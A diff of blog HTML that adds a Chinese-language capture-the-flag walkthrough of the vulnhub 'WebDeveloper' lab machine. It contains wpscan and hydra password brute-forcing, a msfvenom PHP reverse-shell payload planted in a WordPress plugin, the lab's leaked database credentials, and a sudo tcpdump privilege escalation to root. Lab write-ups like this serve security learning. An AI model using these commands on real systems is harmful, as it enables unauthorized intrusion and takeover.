@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>prontosil&#39;s Blog</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="prontosil&#39;s Blog">
+  <title>vulnhub靶机渗透-WebDeveloper | prontosil&#39;s Blog</title>
+  <meta name="keywords" content=" 靶机 ">
+  <meta name="description" content="vulnhub靶机渗透-WebDeveloper | prontosil&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="关于我">
 <meta property="og:type" content="website">
@@ -52,7 +52,7 @@
 </div>
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/img/avatar.jpg" />
@@ -553,12 +553,46 @@
         </div>
     </div>
 </aside>
-<div class="post index">
+<div class="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-vuln靶机渗透-WebDeveloper" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#prontosil’s-blog"><span class="toc-text">prontosil’s blog</span></a></li></ol>
+        <h1 class="article-title">vulnhub靶机渗透-WebDeveloper</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="渗透测试">渗透测试</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color3">靶机</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-02-06 21:54:19'>2020-02-06 21:42</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:678</span>
+        
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -571,23 +605,123 @@
     }
 </style>
 </div>
-            <h1 id="prontosil’s-blog"><a href="#prontosil’s-blog" class="headerlink" title="prontosil’s blog"></a>prontosil’s blog</h1><p>2018年11月，我注册了这个域名，同时开始了自己的博客之路</p>
-<p>一开始对于博客保有热情，什么东西都想往上写，更新速度很快，但是毕竟只有三分钟热度，于是中间搁置了一段时间</p>
-<p>2019年上半年经营了一个学期的简书，个人博客就慢慢地长草了</p>
-<p>但是毕竟不甘心，于是我将自己的个人博客定位为安全文章，正值暑假，于是又写了很多文章。</p>
-<p>中间经历了一些波折，导致我博客的源文件都被删去了，只剩下静态资源</p>
-<p>寒假在家没事做，索性将自己过往的文章进行整理，重新设置博客，希望自己能够写出更好的文章。</p>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描端口发现是 80 和 22开放了，其中80运行着wordpress服务</p>
+<p>使用 <code>wpscan</code> 扫描用户和插件</p>
+<pre><code>wpscan --url http://192.168.99.100/ -e u,p </code></pre><p>发现了用户 <code>webdeveloper</code></p>
+<p>之后自然是尝试爆破密码了，使用 <code>wpscan</code> 和 <code>hydra</code> 同时爆破</p>
+<pre><code>wpscan --url http://192.168.99.100/ -U webdeveloper  -P ./rockyou.txt
 
-        </article>
-        
-        
+hydra -l webdeveloper -P rockyou.txt  -t 10 192.168.99.100 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^:login_error&quot;</code></pre><p>但是经过很长时间后并没有爆破出来，神器 <code>xray</code> 扫描也为探测到相关信息</p>
+<p>也尝试使用了 <code>dirsearch.py</code> ，但是依旧无果</p>
+<p>换用了 <code>dirb</code></p>
+<pre><code>GENERATED WORDS: 4613                                                          
+
+---- Scanning URL: http://192.168.99.100/ ----
++ http://192.168.99.100/index.php (CODE:301|SIZE:0)                                                                                                         
+==&gt; DIRECTORY: http://192.168.99.100/ipdata/   !!!                                                                                                             
++ http://192.168.99.100/server-status (CODE:403|SIZE:302)                                                                                                   
+==&gt; DIRECTORY: http://192.168.99.100/wp-admin/                                                                                                              
+==&gt; DIRECTORY: http://192.168.99.100/wp-content/                                                                                                            
+==&gt; DIRECTORY: http://192.168.99.100/wp-includes/                                                                                                           
++ http://192.168.99.100/xmlrpc.php (CODE:405|SIZE:42)       </code></pre><p>发现了 <code>ipdata/</code> 目录，访问之后是一个流量包</p>
+<p>打开之后过滤</p>
+<pre><code>http.request.method == &quot;POST&quot;</code></pre><p><img src="/posts/4d0603d0/1580996926610.png" alt></p>
+<p>原来密码这么复杂。怪不得爆破不出来</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录后台之后发现安装了两个插件，并且可以修改源代码，这时候就会想到用 <code>msfvenom</code> 生成php木马，然后反弹得到shell</p>
+<pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.99.1 lport=4444 -f raw -o shell.php</code></pre><p>修改一个插件的源码然后启用就能拿到shell了</p>
+<p>然后查看 <code>wp-config.php</code></p>
+<pre><code>// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);
+
+/** MySQL database username */
+define(&#39;DB_USER&#39;, &#39;webdeveloper&#39;);
+
+/** MySQL database password */
+define(&#39;DB_PASSWORD&#39;, &#39;MasterOfTheUniverse&#39;);
+
+/** MySQL hostname */
+define(&#39;DB_HOST&#39;, &#39;localhost&#39;);
+
+/** Database Charset to use in creating database tables. */
+define(&#39;DB_CHARSET&#39;, &#39;utf8mb4&#39;);
+
+/** The Database Collate type. Don&#39;t change this if in doubt. */
+define(&#39;DB_COLLATE&#39;, &#39;&#39;);</code></pre><p>获得了数据库的账号和密码，那就登陆一下数据库</p>
+<p>但是在数据库中并没有获得很多信息</p>
+<pre><code>mysql&gt; show tables;
+show tables;
++-----------------------+
+| Tables_in_wordpress   |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_termmeta           |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+12 rows in set (0.00 sec</code></pre><p>尝试直接ssh登陆，居然可以！</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录之后 ， <code>sudo -l</code></p>
+<pre><code class="bash">webdeveloper@webdeveloper:~$ sudo -l
+[sudo] password for webdeveloper:
+Matching Defaults entries for webdeveloper on webdeveloper:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webdeveloper may run the following commands on webdeveloper:
+    (root) /usr/sbin/tcpdump</code></pre>
+<p>那就可以用 <code>tcpdump</code> 提权了</p>
+<pre><code class="bash">webdeveloper@webdeveloper:~$ touch /tmp/exploit
+webdeveloper@webdeveloper:~$ echo &quot;cat /root/flag.txt&quot; &gt; /tmp/exploit
+webdeveloper@webdeveloper:~$ chmod +x /tmp/exploit
+webdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
+[sudo] password for webdeveloper:
+dropped privs to root
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+710 packets received by filter
+0 packets dropped by kernel
+webdeveloper@webdeveloper:~$ Congratulations here is youre flag:
+cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>vulnhub靶机渗透-WebDeveloper</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">678</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="prontosil">prontosil</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-02-06, 21:42:17</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-06, 21:54:19</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/4d0603d0/" title="vulnhub靶机渗透-WebDeveloper">http://prontosil.com/posts/4d0603d0/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
     <section id="comments" class="disqus">
     <style> aside.comment-bar { margin: auto 30px; }</style>
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://prontosil.com/';
-            this.page.identifier = 'tags/docker/index.html';
+            this.page.url = 'http://prontosil.com/posts/4d0603d0/';
+            this.page.identifier = 'posts/4d0603d0/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -629,8 +763,15 @@
 </section>
 
 <!-- Add comment count-->
-<span class="disqus-comment-count" style="display: none" data-disqus-identifier="tags/docker/index.html"></span>
-<span class="disqus-comment-count" style="display: none" data-disqus-url=""></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-identifier="posts/4d0603d0/"></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-url="http://prontosil.com/posts/4d0603d0/"></span>
+
+
+
+    
+
+
+
 
     </div>
     <div class="copyright">
